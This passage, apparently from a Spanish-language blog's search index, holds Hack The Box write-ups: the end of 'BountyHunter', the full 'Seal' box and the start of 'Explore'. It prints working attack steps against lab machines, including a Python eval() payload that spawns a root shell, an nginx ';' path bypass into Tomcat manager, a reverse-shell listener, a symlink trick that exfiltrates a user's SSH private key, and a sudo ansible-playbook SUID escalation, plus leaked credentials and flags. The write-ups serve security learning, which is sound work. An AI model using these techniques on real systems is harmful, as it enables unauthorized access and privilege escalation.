Shell Utilizamos la contraseña y usuario encontrado, por SSH donde logramos obtener una shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 π ~/htb/bountyhunter ❯ ssh development@10.10.11.100 # m19RoAU0hP41A1sTsq6K The authenticity of host \u0026#39;10.10.11.100 (10.10.11.100)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:3IaCMSdNq0Q9iu+vTawqvIf84OO0+RYNnsDxDBZI04Y. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.11.100\u0026#39; (ECDSA) to the list of known hosts. development@10.10.11.100\u0026#39;s password: Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat 24 Jul 2021 11:32:02 PM UTC System load: 0.07 Usage of /: 25.5% of 6.83GB Memory usage: 24% Swap usage: 0% Processes: 319 Users logged in: 0 IPv4 address for eth0: 10.10.11.100 IPv6 address for eth0: dead:beef::250:56ff:feb9:38d7 0 updates can be applied immediately. Last login: Wed Jul 21 12:04:13 2021 from 10.10.14.8 development@bountyhunter:~$ ls contract.txt user.txt development@bountyhunter:~$ cat user.txt cb9b6766f10dd2aed725167b2e051200 development@bountyhunter:~$ Privesc Tras ejecutar sudo -l -l vemos que tenemos permisos sudo (root) para ejecutar un script de python, el archivo solo tiene permisos de lectura para el usuario actual.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 development@bountyhunter:~$ sudo -l -l Matching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User development may run the following commands on bountyhunter: Sudoers entry: RunAsUsers: root Options: !authenticate Commands: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py development@bountyhunter:~$ ls -lah /opt/skytrain_inc/ticketValidator.py -r-xr--r-- 1 root root 1.5K Jul 22 11:08 /opt/skytrain_inc/ticketValidator.py development@bountyhunter:~$ El script realiza la lectura de archivos .md donde verifica que ciertos \u0026ldquo;strings\u0026rdquo; existan. Vemos tambien que realiza una evaluacion de una expresion lo que supondria una vulnerabilidad.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 #Skytrain Inc Ticket Validation System 0.1 #Do not distribute this file. def load_file(loc): if loc.endswith(\u0026#34;.md\u0026#34;): return open(loc, \u0026#39;r\u0026#39;) else: print(\u0026#34;Wrong file type.\u0026#34;) exit() def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): if i == 0: if not x.startswith(\u0026#34;# Skytrain Inc\u0026#34;): return False continue if i == 1: if not x.startswith(\u0026#34;## Ticket to \u0026#34;): return False print(f\u0026#34;Destination: {\u0026#39; \u0026#39;.join(x.strip().split(\u0026#39; \u0026#39;)[3:])}\u0026#34;) continue if x.startswith(\u0026#34;__Ticket Code:__\u0026#34;): code_line = i+1 continue if code_line and i == code_line: if not x.startswith(\u0026#34;**\u0026#34;): return False ticketCode = x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;).split(\u0026#34;+\u0026#34;)[0] if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;)) if validationNumber \u0026gt; 100: return True else: return False return False def main(): fileName = input(\u0026#34;Please enter the path to the ticket file.\\n\u0026#34;) ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(\u0026#34;Valid ticket.\u0026#34;) else: print(\u0026#34;Invalid ticket.\u0026#34;) ticket.close main() Antes de evaluar la expresion divide la linea por el signo + y toma el primer elemento de la lista, finalmente verifica si el valor restante del elemento es igual a 4 para luego evaluar la linea eliminando el valor ** seguramente para no afectar la evaluacion.\n1 2 3 ticketCode = x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;).split(\u0026#34;+\u0026#34;)[0] if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;)) Local Execution Creamos el archivo .md donde colocamos una pequeña expresion para verificar que este valor sea sumando, modificando el script localmente para verificar los valores.\n1 2 3 4 # Skytrain Inc ## Ticket to sckull.blog __Ticket Code:__ ** 11+1 La modificacion solo es un print para algunas variables.\n1 2 3 4 5 ticketCode = x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;).split(\u0026#34;+\u0026#34;)[0] print(\u0026#34;TicketCode: \u0026#34; + ticketCode) if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;)) print(\u0026#34;Validation Number: \u0026#34; + str(validationNumber)) Tras ejecutar el script vemos que el valor se suma.\n1 2 3 4 5 6 π ~/htb/bountyhunter ❯ python3 help_tickets.py Destination: sckull.blog TicketCode: 11 Validation Number: 12 Invalid ticket. π ~/htb/bountyhunter ❯ Modificamos el archivo .md esta vez con algun payload o codigo para que sea ejecutado en este caso bash.\n1 2 3 4 # Skytrain Inc ## Ticket to sckull.blog __Ticket Code:__ **11+__import__(\u0026#39;os\u0026#39;).system(\u0026#39;/bin/bash -p\u0026#39;) Tras la ejecucion local, se muestra una shell bash.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/bountyhunter ❯ python3 help_tickets.py Destination: sckull.blog TicketCode: 11 ┌──(kali㉿kali)-[~/htb/bountyhunter] └─$ echo \u0026#34;bash\u0026#34; bash ┌──(kali㉿kali)-[~/htb/bountyhunter] └─$ exit exit Validation Number: 11 Invalid ticket. π ~/htb/bountyhunter ❯ Shell Creamos el archivo con el contenido en la maquina lo que nos permitio obtener una shell como root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 development@bountyhunter:~$ echo -n \u0026#34;# Skytrain Inc \u0026gt; ## Ticket to sckull.blog \u0026gt; __Ticket Code:__ \u0026gt; **11+__import__(\u0026#39;os\u0026#39;).system(\u0026#39;/bin/bash -p\u0026#39;)\u0026#34; \u0026gt; batman.md development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. /home/development/batman.md Destination: sckull.blog root@bountyhunter:/home/development# whoami root root@bountyhunter:/home/development# cd /root root@bountyhunter:~# ls root.txt snap root@bountyhunter:~# cat root.txt a8ba869902da854f7c0a4f133fce3879 root@bountyhunter:~# ","description":"En BountyHunter explotamos una vulnerabilidad XXE la cual permitio obtener credenciales para acceder a la maquina. Obtuvimos acceso root mediante el analisis y explotacion de un script en Python especificamente de la funcion 'eval()'.","id":43,"section":"posts","tags":["xxe","python","sudo privesc"],"title":"Hack The Box - BountyHunter","uri":"https://sckull.github.io/posts/bountyhunter/"},{"content":"\rSeal presenta distintos respositorios en GitBucket, donde se muestra la configuracion de Nginx y Tomcat, por medio de estos logramos acceder al primer usuario. Un proceso nos permitió generar un backup de la clave privada con un enlace simbolico de SSH de un segundo usuario. Finalmente escalamos privilegios utilizando ansible-playbook.\nNombre Seal OS Linux Puntos 30 Dificultad Media IP 10.10.10.250 Maker MrR3boot\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.3, 5.9, 4.9, 5.1, 4.1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[6, 10, 5, 5, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap Escaneo de puertos con nmap nos muestra multiples puertos abiertos: ssh (22), https (443), http (8080). Además se muestra un dominio: seal.htb el cual agregamos al archivo /etc/hosts.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 # Nmap 7.91 scan initiated Tue Jul 13 17:58:34 2021 as: nmap -sV -sC -p22,443,8080 -oN scans 10.10.10.250 Nmap scan report for 10.10.10.250 (10.10.10.250) Host is up (0.068s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA) | 256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA) |_ 256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519) 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Seal Market | ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK | Not valid before: 2021-05-05T10:24:03 |_Not valid after: 2022-05-05T10:24:03 | tls-alpn: |_ http/1.1 | tls-nextprotoneg: |_ http/1.1 8080/tcp open http-proxy | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 401 Unauthorized | Date: Tue, 13 Jul 2021 22:15:34 GMT | Set-Cookie: JSESSIONID=node0pikwwm1ufkdt1sapwo4wabcqg2.node0; Path=/; HttpOnly | Expires: Thu, 01 Jan 1970 00:00:00 GMT | Content-Type: text/html;charset=utf-8 | Content-Length: 0 | GetRequest: | HTTP/1.1 401 Unauthorized | Date: Tue, 13 Jul 2021 22:15:33 GMT | Set-Cookie: JSESSIONID=node0onk9vj2as4e4hqd3903kmhjo0.node0; Path=/; HttpOnly | Expires: Thu, 01 Jan 1970 00:00:00 GMT | Content-Type: text/html;charset=utf-8 | Content-Length: 0 | HTTPOptions: | HTTP/1.1 200 OK | Date: Tue, 13 Jul 2021 22:15:34 GMT | Set-Cookie: JSESSIONID=node0l2xbmz674jwh13xgyl9imlaau1.node0; Path=/; HttpOnly | Expires: Thu, 01 Jan 1970 00:00:00 GMT | Content-Type: text/html;charset=utf-8 | Allow: GET,HEAD,POST,OPTIONS | Content-Length: 0 | RPCCheck: | HTTP/1.1 400 Illegal character OTEXT=0x80 | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 71 | Connection: close | \u0026lt;h1\u0026gt;Bad Message 400\u0026lt;/h1\u0026gt;\u0026lt;pre\u0026gt;reason: Illegal character OTEXT=0x80\u0026lt;/pre\u0026gt; | RTSPRequest: | HTTP/1.1 505 Unknown Version | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 58 | Connection: close | \u0026lt;h1\u0026gt;Bad Message 505\u0026lt;/h1\u0026gt;\u0026lt;pre\u0026gt;reason: Unknown Version\u0026lt;/pre\u0026gt; | Socks4: | HTTP/1.1 400 Illegal character CNTL=0x4 | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 69 | Connection: close | \u0026lt;h1\u0026gt;Bad Message 400\u0026lt;/h1\u0026gt;\u0026lt;pre\u0026gt;reason: Illegal character CNTL=0x4\u0026lt;/pre\u0026gt; | Socks5: | HTTP/1.1 400 Illegal character CNTL=0x5 | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 69 | Connection: close |_ \u0026lt;h1\u0026gt;Bad Message 400\u0026lt;/h1\u0026gt;\u0026lt;pre\u0026gt;reason: Illegal character CNTL=0x5\u0026lt;/pre\u0026gt; | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Server returned status 401 but no WWW-Authenticate header. |_http-title: Site doesn\u0026#39;t have a title (text/html;charset=utf-8). # Nmap done at Tue Jul 13 17:58:58 2021 -- 1 IP address (1 host up) scanned in 23.32 seconds Web Site Encontramos una tienda en linea que no presenta ningun tipo de funcionalidad.\nDirectory Brute Forcing Feroxbuster muestra una direccion que pertenece a Tomcat. Al visitar la direccion /manager retorna Codigo 403, lo que significa que no estamos permitidos a acceder.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 π ~/htb/seal ❯ feroxbuster -u https://seal.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ https://seal.htb/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔓 Insecure │ true 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 302 0l 0w 0c https://seal.htb/images 302 0l 0w 0c https://seal.htb/admin 302 0l 0w 0c https://seal.htb/icon 302 0l 0w 0c https://seal.htb/css 302 0l 0w 0c https://seal.htb/js 302 0l 0w 0c https://seal.htb/manager [####################] - 10m 220545/220545 0s found:6 errors:0 [####################] - 10m 220545/220545 360/s https://seal.htb/ GitBucket En el puerto 8080 encontramos GitBucket tras registrar e ingresar un usuario en el panel de registro vemos dos repositorios.\nSegun la definicion, el primero es la tienda que se muestra en el puerto 80, el segundo se describe como un Playbook para administrar la tienda (Tomcat).\nSeal Market - Repo Descubrimos en Seal_market un commit en el que se modifica el archivo tomcat-users.xml, se muestra un usuario y contraseña (tomcat:42MrHBf*z8{Z%).\nAdemás vemos que la app (Seal Market) solo es una pagina estatica sin ninguna conexion a alguna base de datos.\nTambien en la configuracion de nginx (nginx/sites-available/default) vemos que no permite acceder a distintas rutas sin autenticación mediante un certificado, en el caso de no estar autenticado retorna codigo 403 como en /manager, tambien vemos configuracion para Reverse Proxy.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 ssl_certificate /var/www/keys/selfsigned.crt; ssl_certificate_key /var/www/keys/selfsigned.key; ssl_client_certificate /var/www/keys/selfsigned-ca.crt; server { listen 443 ssl default_server; listen [::]:443 ssl default_server; root /var/www/html; ssl_protocols TLSv1.1 TLSv1.2; ssl_verify_client optional; index index.html index.htm index.nginx-debian.html; server_name _; location /manager/html { if ($ssl_client_verify != SUCCESS) { return 403; } proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_pass http://localhost:8000; proxy_read_timeout 90; proxy_redirect http://localhost:8000 https://0.0.0.0; } location /admin/dashboard { if ($ssl_client_verify != SUCCESS) { return 403; } proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_pass http://localhost:8000; proxy_read_timeout 90; proxy_redirect http://localhost:8000 https://0.0.0.0; } location /host-manager/html { if ($ssl_client_verify != SUCCESS) { return 403; } proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_pass http://localhost:8000; proxy_read_timeout 90; proxy_redirect http://localhost:8000 https://0.0.0.0; } location / { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_pass http://localhost:8000; proxy_read_timeout 90; proxy_redirect http://localhost:8000 https://0.0.0.0; } } Luis - Account En los commits de Seal Market se muestran nombres de posibles usuarios, y, utilizando la contraseña que encontramos pudimos acceder a la cuenta de Luis, aunque no encontramos algun otro repositorio, pero tenemos permisos sobre uno de los repositorios. Descubrimos tambien, exploits que permiten ejecutar comandos aunque no parece afectar a esta version de GitBucket.\nTomcat Intentamos subir una shell inversa como en Tabby - HTB pero dicha direccion no esta permitida tal y como se define en la configuracion de Nginx, de cierta forma necesitamos hacer algun tipo de Bypass.\n1 2 3 4 5 6 π ~/htb/seal ❯ curl -sk --upload-file batman.war --user \u0026#39;tomcat:42MrHBf*z8{Z%\u0026#39; \u0026#34;https://seal.htb/manager/text/deploy?path=/batman\u0026amp;update=True\u0026#34; | html2text ****** 403 Access Denied ****** You are not authorized to view this page. By default the Manager is only accessible from a browser running on the same machine as Tomcat. If you wish to modify this restriction, you\u0026#39;ll need to edit the Manager\u0026#39;s context.xml file. Seal Market Encontramos algunos recursos relacionados a Nginx Misconfiguration (1, 2), Security restrictiont bypass (1) y Reverse Proxy Attacks, en este ultimo se muestran algunas formas para realizar bypass. Finalmente en Breaking Parser Logic! (Pag 42-62) se muestran algunos ejemplos entre ellos encontramos un \u0026ldquo;payload\u0026rdquo; (;name=orange) y el comportamiento que toma en diferentes servidores.\nEn el ejemplo (http://example.com/foo;name=orange/bar/) tomcat toma la direccion como /foo/bar/ lo que permitiría acceder a rutas las cuales no estamos permitidos.\nAl utilizar el \u0026ldquo;payload\u0026rdquo; (;) en la direccion (https://seal.htb/manager;/html) del panel de tomcat nos permitió acceder con las credenciales de tomcat.\nTomcat - User Shell Por alguna razon Firefox no permite subir un archivo .war segun parece, por las cookies, creamos y subimos con Chromium una webshell lo que nos permitió ejecutar comandos, utilizamos Reverse Shell as a Service para la ejecucion de una shell inversa.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 π ~/htb/seal ❯ rlwrap nc -lvp 1335 listening on [any] 1335 ... connect to [10.10.14.24] from seal.htb [10.10.10.250] 58844 /bin/sh: 0: can\u0026#39;t access tty; job control turned off which python which python3 /usr/bin/python3 python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; whoami; id; pwd whoami; id; pwd tomcat uid=997(tomcat) gid=997(tomcat) groups=997(tomcat) /var/lib/tomcat9 tomcat@seal:/var/lib/tomcat9$ Luis - User Listando los procesos vemos el comando ansible-playbook ejecutando un archivo yaml (run.yml) cada 30 segundos, dentro de este archivo encontramos 3 tareas, una de estas realiza una copia o backup de los archivos de /var/lib/tomcat9/webapps/ROOT/admin/dashboard incluyendo los symlinks luego crea un archivo .gz en /opt/backups/archives/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 tomcat@seal:/$ ps -ef|grep luis luis 878 854 0 05:32 ? 00:00:00 /bin/sh -c java -jar /home/luis/gitbucket.war luis 880 878 2 05:32 ? 00:21:56 java -jar /home/luis/gitbucket.war root 254757 254756 0 22:53 ? 00:00:00 /bin/sh -c sleep 30 \u0026amp;\u0026amp; sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml tomcat 254762 252177 0 22:53 pts/1 00:00:00 grep luis tomcat@seal:/$ ls -lah /usr/bin/ansible-playbook lrwxrwxrwx 1 root root 7 Mar 16 2020 /usr/bin/ansible-playbook -\u0026gt; ansible tomcat@seal:/$ ls -lah /opt/backups/playbook/run.yml -rw-rw-r-- 1 luis luis 403 May 7 07:14 /opt/backups/playbook/run.yml tomcat@seal:/$ cat /opt/backups/playbook/run.yml - hosts: localhost tasks: - name: Copy Files synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes - name: Server Backups archive: path: /opt/backups/files/ dest: \u0026#34;/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz\u0026#34; - name: Clean file: state: absent path: /opt/backups/files/ tomcat@seal:/$ En la carpeta dashboard encontramos uploads/ dentro de esta tenemos permisos de escritura, creamos un \u0026lsquo;symlink\u0026rsquo; apuntando a la carpeta .ssh del usuario Luis, ya que el proceso es ejecutado con este usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ ls -lah total 100K drwxr-xr-x 7 root root 4.0K May 7 09:26 . drwxr-xr-x 3 root root 4.0K May 6 10:48 .. drwxr-xr-x 5 root root 4.0K Mar 7 2015 bootstrap drwxr-xr-x 2 root root 4.0K Mar 7 2015 css drwxr-xr-x 4 root root 4.0K Mar 7 2015 images -rw-r--r-- 1 root root 71K May 6 10:42 index.html drwxr-xr-x 4 root root 4.0K Mar 7 2015 scripts drwxrwxrwx 2 root root 4.0K Jul 16 23:12 uploads tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ cd uploads tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ln -s /home/luis/.ssh \u0026lt;ROOT/admin/dashboard/uploads$ ln -s /home/luis/.ssh tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ls -lah total 8.0K drwxrwxrwx 2 root root 4.0K Jul 16 23:12 . drwxr-xr-x 7 root root 4.0K May 7 09:26 .. lrwxrwxrwx 1 tomcat tomcat 15 Jul 16 23:12 .ssh -\u0026gt; /home/luis/.ssh tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ Vemos que se creó el backup, realizamos una copia y tras extraer el contenido vemos la clave privada de Luis.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 tomcat@seal:/opt/backups/archives$ ls -lah total 1.8M drwxrwxr-x 2 luis luis 4.0K Jul 16 23:22 . drwxr-xr-x 4 luis luis 4.0K Jul 16 23:22 .. -rw-rw-r-- 1 luis luis 596K Jul 16 23:20 backup-2021-07-16-23:20:32.gz -rw-rw-r-- 1 luis luis 596K Jul 16 23:21 backup-2021-07-16-23:21:32.gz -rw-rw-r-- 1 luis luis 596K Jul 16 23:22 backup-2021-07-16-23:22:32.gz tomcat@seal:/opt/backups/archives$ cp backup-2021-07-16-23:23:32.gz /dev/shm tomcat@seal:/opt/backups/archives$ cd /dev/shm tomcat@seal:/dev/shm$ ls backup-2021-07-16-23:23:32.gz tomcat@seal:/dev/shm$ mv backup* backup.gz tomcat@seal:/dev/shm$ tar -zxvf backup.gz [ ... REDACTED ... ] dashboard/uploads/.ssh/ dashboard/uploads/.ssh/id_rsa dashboard/uploads/.ssh/id_rsa.pub dashboard/uploads/.ssh/authorized_keys [ ... REDACTED ... ] tomcat@seal:/dev/shm$ Con ello conseguimos acceso a este usuario por SSH y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 π ~/htb/seal ❯ ssh luis@seal.htb -i id_rsa_luis Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Fri 16 Jul 2021 11:06:53 PM UTC System load: 0.14 Usage of /: 47.1% of 9.58GB Memory usage: 60% Swap usage: 0% Processes: 180 Users logged in: 0 IPv4 address for eth0: 10.10.10.250 IPv6 address for eth0: dead:beef::250:56ff:feb9:1ee8 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Fri Jul 16 17:22:51 2021 from 10.10.14.4 luis@seal:~$ ls gitbucket.war user.txt luis@seal:~$ cat user.txt 9ee0bf21e12a6c27854c72cb79d3729a luis@seal:~$ DB - Gitbucket En la carpeta principal de Luis encontramos el archivo data.mv.db, con dbeaver vemos que es la \u0026ldquo;base de datos\u0026rdquo; de esta plataforma, además encontramos los hashes de los usuarios registrados.\nPrivesc Tras ejecutar sudo -l -l vemos que tenemos permisos sudo (root) para ejecutar el comando ansible-playbook.\n1 2 3 4 5 6 7 8 9 10 11 12 luis@seal:~$ sudo -l -l Matching Defaults entries for luis on seal: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User luis may run the following commands on seal: Sudoers entry: RunAsUsers: ALL Options: !authenticate Commands: /usr/bin/ansible-playbook * luis@seal:~$ Creamos un archivo que le da permisos suid a /bin/bash en la carpeta de Luis.\n1 echo \u0026#34;chmod u+s /bin/bash\u0026#34; \u0026gt; /home/luis/upgrade_bash.sh Tambien creamos el archivo upgrade.yml siguiendo la documentacion para ejecutar comandos en este caso para ejecutar nuestro archivo upgrade_bash.sh.\n1 2 3 4 - hosts: localhost tasks: - name: Upgrade Bash to SUID command: /bin/bash /home/luis/upgrade_bash.sh Tras ejecutar el archivo logramos obtener una shell como root y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 luis@seal:~$ sudo /usr/bin/ansible-playbook upgrade.yml [WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match \u0026#39;all\u0026#39; PLAY [localhost] *************************************************************************************************************************************************************************** TASK [Gathering Facts] ********************************************************************************************************************************************************************* ok: [localhost] TASK [SSH Key] ***************************************************************************************************************************************************************************** changed: [localhost] PLAY RECAP ********************************************************************************************************************************************************************************* localhost : ok=2 changed=1 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 luis@seal:~$ ls -lah /bin/bash -rwsr-xr-x 1 root root 1.2M Jun 18 2020 /bin/bash luis@seal:~$ /bin/bash -p bash-5.0# whoami root bash-5.0# cd /root bash-5.0# ls root.txt snap bash-5.0# cat root.txt 05a0803bb8bb99a5cb90f63c08b74445 bash-5.0# ","description":"Seal presenta distintos respositorios en GitBucket, donde se muestra la configuracion de Nginx y Tomcat, por medio de estos logramos acceder al primer usuario. Un proceso nos permitió generar un backup de la clave privada con un enlace simbolico de SSH de un segundo usuario. Finalmente escalamos privilegios utilizando ansible-playbook.","id":44,"section":"posts","tags":["ansible-playbook","playbook","symlink","tomcat","nginx","gitbucket"],"title":"Hack The Box - Seal","uri":"https://sckull.github.io/posts/seal/"},{"content":"\rExplorer, la primera maquina android en HTB. Encontramos un puerto relacionado a ES File Explorer que expone una API que permite listar y descargar archivos del dispositivo, por donde descubrimos credenciales de acceso en una imagen. Para escalar privilegios utilizamos SSH para conectarnos con ADB a una shell privilegiada.\nNombre Explore OS Android Puntos 20 Dificultad Facil IP 10.10.10.247 Maker bertolis\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.2, 4.4, 5, 5, 5.6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 